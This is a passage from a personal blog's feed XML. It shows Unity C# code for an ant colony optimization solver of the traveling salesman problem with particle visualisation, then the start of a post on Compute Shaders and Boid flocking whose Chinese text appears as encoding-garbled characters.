particles[nowIndex].SetParticleRot(angle);</span><br><span class="line"></span><br><span class="line">                    particles[nowIndex].SetParticleDis(dis[nowIndex]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// initialize line renderer</span></span><br><span class="line">        lineRenderer = GetComponent&lt;LineRenderer&gt;();</span><br><span class="line">        lineRenderer.positionCount = numPoint + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        bSpace = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.W))</span><br><span class="line">        &#123;</span><br><span class="line">            preTimeLeft = preTimes;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (preTimeLeft &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            preTimeLeft--;</span><br><span class="line">            Opt();</span><br><span class="line">            <span class="keyword">if</span> (preTimeLeft == <span class="number">0</span>) print(<span class="string">&quot;preTimeFinished&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.Space))</span><br><span class="line">        &#123;</span><br><span class="line">            bSpace = <span class="literal">true</span>;</span><br><span class="line">            Opt();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.S))</span><br><span class="line">        &#123;</span><br><span class="line">            GameObject[] points = GameObject.FindGameObjectsWithTag(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                Destroy(points[i]);</span><br><span class="line">                nowPath.ClearPath();</span><br><span class="line">            &#125;</span><br><span class="line">            Start();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.A))</span><br><span class="line">        &#123;</span><br><span class="line">            print(<span class="string">&quot;AUTO&quot;</span>);</span><br><span class="line">            bAuto = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.D))</span><br><span class="line">        &#123;</span><br><span class="line">            print(<span class="string">&quot;MANUAL&quot;</span>);</span><br><span class="line">            bAuto = <span class="literal">false</span>;</span><br><span class="line">            print(turnCnt);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bAuto) Opt();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Opt</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        turnCnt++;</span><br><span class="line">        <span class="built_in">int</span>[] path = <span class="keyword">new</span> <span class="built_in">int</span>[numPoint * numInGroup];</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> antCnt = <span class="number">0</span>; antCnt &lt; numInGroup; antCnt++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// offset of starting point index</span></span><br><span class="line">            <span class="built_in">int</span> offset = Random.Range(<span class="number">0</span>, numPoint);</span><br><span class="line">            <span class="built_in">int</span> nowP = offset;</span><br><span class="line">            <span class="built_in">int</span> numVisited = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">bool</span>[] visited = <span class="keyword">new</span> <span class="built_in">bool</span>[numPoint];</span><br><span class="line">            visited[offset] = <span class="literal">true</span>;</span><br><span class="line">            path[numPoint * antCnt] = offset;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> turn = <span class="number">0</span>; turn &lt; numPoint - <span class="number">1</span>; turn++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">float</span>[] tempDis = <span class="keyword">new</span> <span class="built_in">float</span>[numPoint];</span><br><span class="line">                <span class="built_in">float</span>[] tempPhe = <span class="keyword">new</span> <span class="built_in">float</span>[numPoint];</span><br><span class="line">                <span class="built_in">float</span>[] weight = <span class="keyword">new</span> <span class="built_in">float</span>[numPoint];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    <span class="keyword">if</span> (!visited[i])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">int</span> nowIndex = GetPathIndex(nowP, i);</span><br><span class="line">                        <span class="built_in">float</span> nowDis = Mathf.Pow(<span class="number">1f</span> / dis[nowIndex], disPow);</span><br><span class="line">                        <span class="comment">// weight will be diveded by total then</span></span><br><span class="line">                        tempPhe[i] = pheromone[nowIndex];</span><br><span class="line">                        tempDis[i] = nowDis;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// calculate weight</span></span><br><span class="line">                <span class="built_in">float</span> totalWeight = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    <span class="keyword">if</span> (!visited[i])</span><br><span class="line">                    &#123;</span><br><span class="line">                        weight[i] = Mathf.Pow(tempDis[i] * tempPhe[i], weightPow);</span><br><span class="line">                        <span class="comment">// reduce chance of getting cross</span></span><br><span class="line">                        <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; numVisited - <span class="number">1</span>; j ++)</span><br><span class="line">                            <span class="keyword">if</span>(DetectCross(pPos[i], pPos[nowP], pPos[path[j + numPoint * antCnt]], pPos[path[j + <span class="number">1</span> + numPoint * antCnt]]))</span><br><span class="line">                                weight[i] /= crossDiv;</span><br><span class="line"></span><br><span class="line">                        totalWeight += weight[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    <span class="keyword">if</span> (!visited[i])</span><br><span class="line">                        weight[i] /= totalWeight;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Random.value returns in range [0,1]</span></span><br><span class="line">                <span class="built_in">float</span> choice = Random.<span class="keyword">value</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">int</span> decideIndex = offset;</span><br><span class="line">                <span class="built_in">int</span> maxCnt = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (maxCnt &lt; <span class="number">2</span> * numPoint)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">int</span> judgingIndex = decideIndex % numPoint;</span><br><span class="line">                    choice -= weight[judgingIndex];</span><br><span class="line">                    <span class="keyword">if</span> (choice &lt;= <span class="number">0</span> &amp;&amp; !visited[judgingIndex])</span><br><span class="line">                    &#123;</span><br><span class="line">                        numVisited++;</span><br><span class="line">                        path[numVisited + numPoint * antCnt] = judgingIndex;</span><br><span class="line">                        nowP = judgingIndex;</span><br><span class="line">                        visited[judgingIndex] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    decideIndex++;</span><br><span class="line">                    maxCnt++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// update when a turn is ending</span></span><br><span class="line">            <span class="keyword">if</span> (antCnt == numInGroup - <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">float</span> localMinPathDis = <span class="built_in">float</span>.MaxValue;</span><br><span class="line">                <span class="built_in">float</span>[] disGroup = <span class="keyword">new</span> <span class="built_in">float</span>[numInGroup];</span><br><span class="line">                <span class="built_in">int</span> localMinIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// get localMinPathDis and its index</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> antIndex = <span class="number">0</span>; antIndex &lt; numInGroup; antIndex++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                        disGroup[antIndex] += dis[GetPathIndex(path[i + numPoint * antIndex],</span><br><span class="line">                            (i + <span class="number">1</span>) % numPoint == <span class="number">0</span> ? path[numPoint * antIndex] : path[i + <span class="number">1</span> + numPoint * antIndex])];</span><br><span class="line">                    <span class="keyword">if</span> (disGroup[antIndex] &lt; localMinPathDis)</span><br><span class="line">                    &#123;</span><br><span class="line">                        localMinPathDis = disGroup[antIndex];</span><br><span class="line">                        localMinIndex = antIndex;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">int</span>[] localMinPath = <span class="keyword">new</span> <span class="built_in">int</span>[numPoint];</span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    localMinPath[i] = path[i + localMinIndex * numPoint];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(bFirstRound)</span><br><span class="line">                &#123;</span><br><span class="line">                    minPathDis = localMinPathDis;</span><br><span class="line">                    minCrossCnt = CountCross(localMinPath);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(bDrawLine) lineRenderer.SetPosition(i, pPos[localMinPath[i]]);</span><br><span class="line">                        minPath[i] = localMinPath[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(bDrawLine) lineRenderer.SetPosition(numPoint, pPos[localMinPath[<span class="number">0</span>]]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// pheromone drop</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPath; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    pheromone[i] *= pheDrop;</span><br><span class="line">                    <span class="keyword">if</span> (pheromone[i] &lt; pheMin) pheromone[i] = pheMin;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// add pheromone of the turn</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> antIndex = <span class="number">0</span>; antIndex &lt; numInGroup; antIndex++)</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">int</span> nowIndex = GetPathIndex(path[i + numPoint * antIndex], (i + <span class="number">1</span>) % numPoint == <span class="number">0</span></span><br><span class="line">                            ? path[numPoint * antIndex] : path[i + <span class="number">1</span> + numPoint * antIndex]);</span><br><span class="line">                        <span class="comment">// shorter path impacts pheromone more</span></span><br><span class="line">                        pheromone[nowIndex] += deltaPhe * Mathf.Pow(localMinPathDis / disGroup[antIndex], dropPow);</span><br><span class="line">                        <span class="keyword">if</span> (pheromone[nowIndex] &gt; pheMax) pheromone[nowIndex] = pheMax;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// emphasize best solution but avoid its crossing parts and small angle</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">int</span> cur1 = minPath[i];</span><br><span class="line">                    <span class="built_in">int</span> cur2 = (i + <span class="number">1</span>) % numPoint == <span class="number">0</span> ? minPath[<span class="number">0</span>] : minPath[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="built_in">int</span> nowIndex = GetPathIndex(cur1, cur2);</span><br><span class="line">                    pheromone[nowIndex] += deltaPhe * emphasizeBest;</span><br><span class="line">                    <span class="keyword">if</span> (pheromone[nowIndex] &gt; pheMax) pheromone[nowIndex] = pheMax;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// avoid crossing</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)</span><br><span class="line">                        <span class="keyword">if</span> (DetectCross(pPos[cur1], pPos[cur2], pPos[minPath[j]], pPos[minPath[j + <span class="number">1</span>]]))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">int</span> anoIndex = GetPathIndex(minPath[j], minPath[j + <span class="number">1</span>]);</span><br><span class="line">                            pheromone[nowIndex] = pheMin;</span><br><span class="line">                            pheromone[anoIndex] = pheMin;</span><br><span class="line"></span><br><span class="line">                            pheromone[GetPathIndex(cur1, minPath[j])] += deltaPhe * crossTweakForce;</span><br><span class="line">                            <span class="keyword">if</span> (pheromone[GetPathIndex(cur1, minPath[j])] &gt; pheMax) pheromone[nowIndex] = pheMax;</span><br><span class="line">                            pheromone[GetPathIndex(cur2, minPath[j + <span class="number">1</span>])] += deltaPhe * crossTweakForce;</span><br><span class="line">                            <span class="keyword">if</span> (pheromone[GetPathIndex(cur2, minPath[j + <span class="number">1</span>])] &gt; pheMax) pheromone[nowIndex] = pheMax;</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="comment">// avoid small angle</span></span><br><span class="line">                    <span class="keyword">if</span> (i != <span class="number">0</span> &amp;&amp; DetectSmallAngle(pPos[cur1] - pPos[cur2], pPos[cur1] - pPos[minPath[i - <span class="number">1</span>]], angleOffset))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">int</span> anoIndex = GetPathIndex(minPath[i - <span class="number">1</span>], cur1);</span><br><span class="line"></span><br><span class="line">                        pheromone[nowIndex] -= deltaPhe * emphasizeBest;</span><br><span class="line">                        pheromone[anoIndex] -= deltaPhe * emphasizeBest;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// set particle size based on pheromone</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint &amp;&amp; bParticle; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">int</span> mostPheIndex = i + <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> j = i + <span class="number">1</span>; j &lt; numPoint; j++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">int</span> nowIndex = GetPathIndex(i, j);</span><br><span class="line">                        <span class="built_in">float</span> sizeRatio = (pheromone[nowIndex] - pheMin) / (pheMax - pheMin);</span><br><span class="line">                        particles[nowIndex].SetParticleSize(sizeRatio);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                    </span><br><span class="line">                <span class="comment">// update minPathDis and display</span></span><br><span class="line">                <span class="keyword">if</span> (localMinPathDis &lt; minPathDis)</span><br><span class="line">                &#123;</span><br><span class="line">                    minCrossCnt = CountCross(localMinPath);</span><br><span class="line">                    minPathDis = localMinPathDis;</span><br><span class="line">                    print(minPathDis);</span><br><span class="line">                    print(minCrossCnt);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numPoint; i++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(bDrawLine) lineRenderer.SetPosition(i, pPos[localMinPath[i]]);</span><br><span class="line">                        minPath[i] = localMinPath[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">if</span>(bDrawLine) lineRenderer.SetPosition(numPoint, pPos[localMinPath[<span class="number">0</span>]]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// show Recent Path</span></span><br><span class="line">                <span class="keyword">if</span> (bSpace &amp;&amp; !bParticle) nowPath.DrawNowPath(path, pPos, numPoint, localMinIndex);</span><br><span class="line"></span><br><span class="line">                bFirstRound = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">int</span> <span class="title">CountCross</span>(<span class="params"><span class="built_in">int</span>[] path</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="built_in">int</span> crossCnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">2</span>; i &lt; path.Length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Vector3 pA = pPos[path[i]];</span><br><span class="line">            Vector3 pB = pPos[i + <span class="number">1</span> == path.Length ? path[<span class="number">0</span>] : path[i + <span class="number">1</span>]];</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                Vector3 pC = pPos[path[j]];</span><br><span class="line">                Vector3 pD = pPos[path[j + <span class="number">1</span>]];</span><br><span class="line">                <span class="keyword">if</span>(DetectCross(pA, pB, pC, pD)) crossCnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> crossCnt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">bool</span> <span class="title">DetectCross</span>(<span class="params">Vector3 pA, Vector3 pB, Vector3 pC, Vector3 pD</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Vector3.Dot(Vector3.Cross(pA - pD, pC - pD), Vector3.Cross(pB - pD, pC - pD)) &lt; <span class="number">0</span></span><br><span class="line">            &amp;&amp; Vector3.Dot(Vector3.Cross(pC - pB, pA - pB), Vector3.Cross(pD - pB, pA - pB)) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">bool</span> <span class="title">DetectSmallAngle</span>(<span class="params">Vector2 vec1, Vector2 vec2, <span class="built_in">float</span> angleOffset</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Vector2.Angle(vec1, vec2) &lt; angleOffset)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        Particles    </div>    <div class='spoiler-content'>        <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Particle</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> sizePow;</span><br><span class="line">    [<span class="meta">HideInInspector</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">new</span> ParticleSystem particleSystem;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Awake</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        particleSystem = GetComponent&lt;ParticleSystem&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetParticleRot</span>(<span class="params"><span class="built_in">float</span> angle</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> sh = particleSystem.shape;</span><br><span class="line">        sh.enabled = <span class="literal">true</span>;</span><br><span class="line">        sh.shapeType = ParticleSystemShapeType.Rectangle;</span><br><span class="line">        sh.rotation = <span class="keyword">new</span> Vector3(<span class="number">0f</span>, angle, <span class="number">0f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetParticleDis</span>(<span class="params"><span class="built_in">float</span> dis</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> main = particleSystem.main;</span><br><span class="line">        <span class="built_in">float</span> speed = main.startSpeed.constant;</span><br><span class="line">        main.startLifetime = dis / speed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// max Size = 2.5, min Size = 0.5</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetParticleSize</span>(<span class="params"><span class="built_in">float</span> sizeRatio</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> main = particleSystem.main;</span><br><span class="line">        sizeRatio = Mathf.Pow(sizeRatio, sizePow);</span><br><span class="line">        <span class="built_in">float</span> size = sizeRatio * <span class="number">2.5f</span>;</span><br><span class="line">        main.startSize = size &gt; <span class="number">0.5f</span>? size : <span class="number">0f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;èšç¾¤ä¼˜åŒ–ç®—æ³•ï¼Œæœ€ç›´è§‚çš„ä¸€ä¸ªç¤ºä¾‹ç”¨é€”æ˜¯è§£å†³TPSï¼ˆTravelingSealsmanProblemï¼‰é—®é¢˜ï¼Œå¿«é€Ÿå¯»æ‰¾ä¸€ä¸ªå¯è§‚çš„è§£ï¼Œä½†éœ€è¦ä½ è°ƒçš„ä¸€æ‰‹å¥½å‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/ACO_cover.gif&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Unity" scheme="https://kyriota.github.io/categories/Unity/"/>
    
    
  </entry>
  
  <entry>
    <title>Unity - Compute Shader and Boid</title>
    <link href="https://kyriota.github.io/2021/09/23/Unity-ComputeShaderAndBoid/"/>
    <id>https://kyriota.github.io/2021/09/23/Unity-ComputeShaderAndBoid/</id>
    <published>2021-09-23T02:28:20.000Z</published>
    <updated>2022-08-02T06:49:47.226Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åˆ·æ²¹ç®¡çœ‹åˆ°ä¸€ä¸ªå…³äºç”Ÿç‰©ç¾¤æ¨¡æ‹Ÿçš„Unityå°é¡¹ç›®ï¼Œå…¶ä¸­æåˆ°äº†ä½¿ç”¨ComputeShaderæ¥å®ç°å¤šçº¿ç¨‹çš„å¹¶è¡Œè®¡ç®—ï¼Œæ„Ÿè§‰å¾ˆé€‚åˆå…¥é—¨ï¼Œå°±åšäº†ä¸€äº›å°è¯•å’Œæ”¹è‰¯</p><p><img src="/images/Boid_Cover.png"></p><span id="more"></span><h1 id="Compute-Shader-and-Boid"><a href="#Compute-Shader-and-Boid" class="headerlink" title="Compute Shader and Boid"></a>Compute Shader and Boid</h1><p><img src="/images/Boid_WholeFinish.png"></p><ul><li>é¦–å…ˆï¼Œä»€ä¹ˆæ˜¯<code>ComputeShader</code>ï¼Ÿ</li></ul><blockquote><p>A <strong>Compute Shader</strong> is a Shader Stage that is used entirely for computing arbitrary information. While it can do rendering, it is generally used for tasks not <em>directly</em> related to drawing triangles and pixels.</p></blockquote><p>ç®€å•åœ°è¯´ï¼Œå°±æ˜¯ä¸€ä¸ªæŠŠä»»åŠ¡ä»CPUç§»åˆ°GPUè®¡ç®—çš„shaderå°±æ˜¯ComputeShaderã€‚å…³äºä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšï¼ŒGPUæ˜¯å–„äºå¤„ç†é«˜åº¦ç»Ÿä¸€ï¼Œé‡å¤æ€§é«˜çš„è®¡ç®—çš„ï¼Œå¯ä»¥ä¸€æ¬¡æ€§æŠŠå¤§é‡æ•°æ®å†™å…¥bufferï¼Œç„¶åè¿›è¡Œå¹¶å‘çš„è®¡ç®—ï¼Œåœ¨å®é™…è¡¨ç°ä¸­ï¼Œä½¿ç”¨äº†ComputeShaderåçš„æ€§èƒ½æå‡æ¯”çº¯C#è„šæœ¬çš„æ•ˆç‡æå‡äº†è‡³å°‘ä¸¤å€</p><p>å…·ä½“è¯´è¯´å¹¶å‘è®¡ç®—ï¼Œå…¶å®ä¹Ÿå°±æ˜¯å¤šçº¿ç¨‹ï¼ŒGPUè¿›è¡Œå¤šçº¿ç¨‹è®¡ç®—æ—¶ï¼Œä¼šç­‰åˆ°å½“å‰bufferä¸­çš„æœ€åä¸€é¡¹æ“ä½œæ‰§è¡Œå®Œæˆåå†è¿”å›ï¼Œè¿™å°±å¯¼è‡´ç±»ä¼¼çŸ­æ¿æ•ˆåº”çš„â€œé•¿æ¿æ•ˆåº”â€ï¼Œæˆ‘çš„ç²—ç•¥ç†è§£ä¸ºæ‰§è¡Œä¸€è½®è®¡ç®—çš„æ—¶é—´æ˜¯éœ€è¦æ“ä½œæ¬¡æ•°æœ€å¤šçš„ä¸€ä¸ªçº¿ç¨‹ï¼Œäºæ˜¯å¾ˆæ˜æ˜¾ï¼ŒComputeShaderä¸èƒ½ç”¨äºåˆ†æ”¯å¤šï¼Œè¿è¡Œæ—¶é—´å·®å¼‚å¤§çš„ç®—æ³•</p><ul><li>å…¶æ¬¡ï¼Œä»€ä¹ˆæ˜¯<code>Boid</code>ï¼Ÿ</li></ul><p>å¯¹äºç”Ÿç‰©ç¾¤çš„æ¨¡æ‹Ÿï¼Œæ ¹æ® <a href="http://www.cs.toronto.edu/~dt/siggraph97-course/cwr87/">è¿™ç¯‡æ–‡ç« </a>ï¼Œå¯ä»¥ç®€å•æŠŠç”Ÿç‰©ç¾¤çš„è¡Œä¸ºæŠ½è±¡ä¸ºä»¥ä¸‹ä¸‰æ¡</p><blockquote><ol><li>Collision Avoidance: avoid collisions with nearby flockmates</li><li>Velocity Matching: attempt to match velocity with nearby flockmates</li><li>Flock Centering: attempt to stay close to nearby flockmates</li></ol></blockquote><p>ä¹Ÿå°±æ˜¯ï¼šé¿å…ç¢°æ’ï¼Œé€Ÿåº¦åŒ¹é…ï¼Œä½ç½®å±…ä¸­ã€‚è¿˜æœ‰ä¸åŒçš„æŠ½è±¡æ–¹æ³•ï¼Œè¶Šç»†è‡´çš„è§„åˆ™èƒ½å¡‘é€ çš„ç¾¤ä½“å¿…ç„¶ä¹Ÿä¼šè¶Šå¤æ‚ï¼Œä½†å…¶å®åªè¦åº”ç”¨äº†è¿™ä¸‰ä¸ªè§„åˆ™ï¼Œå°±å·²ç»å¾ˆå¤Ÿçœ‹äº†</p><hr><p>æœ¬å·¥ç¨‹å°†ç¾¤è½æ˜ç¡®ä¸ºé±¼ç¾¤ï¼Œæ¥ä¸‹æ¥å°†ä¼šä»é±¼ç¾¤çš„æŠ½è±¡è§„åˆ™è¿›è¡Œå°è§„æ¨¡æ¨¡æ‹Ÿï¼Œåˆ°åº”ç”¨ComputeShaderæ¨¡æ‹Ÿå¤§è§„æ¨¡é±¼ç¾¤ï¼Œæœ€åä½¿ç”¨ShaderGraphåˆ¶ä½œé±¼çš„æ‘†åŠ¨ä»¥åŠæ°´é¢æ¥å®Œå–„æ•´ä¸ªå·¥ç¨‹ï¼Œä¸ºå…¶æ¶¦è‰²</p><blockquote><p>å…¶å®å½“çœŸçš„æ•²ä»£ç çš„æ—¶å€™ä¼šå‘ç°çº¦æŸé±¼ç¾¤çš„è§„åˆ™éƒ½éå¸¸ç®€å•ï¼Œä½†æ˜¯å¤šä¸ªä¸ªä½“æ‰€ç»„æˆçš„ç³»ç»Ÿç¡®å®å¤æ‚çš„</p></blockquote><h2 id="Getting-Start"><a href="#Getting-Start" class="headerlink" title="Getting Start"></a>Getting Start</h2><p>å› ä¸ºæˆ‘è‡ªå·±ä¹Ÿæ˜¯Unityå…¥é—¨ï¼Œå¯¹äºé‡Œé¢çš„Rigibodyä¹‹ç±»çš„å†…ç½®åŠ›å­¦ç³»ç»Ÿä¸å¤ªäº†è§£ï¼Œä¹Ÿä¸çŸ¥é“é€šå¸¸çš„å¤„ç†è¿™ç±»åŠ›å­¦é—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼Œæ°å¥½æˆ‘æ‰‹ä¸Šæ‹¿åˆ°çš„æ²¹ç®¡dalaoçš„ç¤ºä¾‹ä»£ç ç”¨çš„æ˜¯å…¬å¼æ³•ï¼Œå³å°†é€Ÿåº¦ï¼ŒåŠ 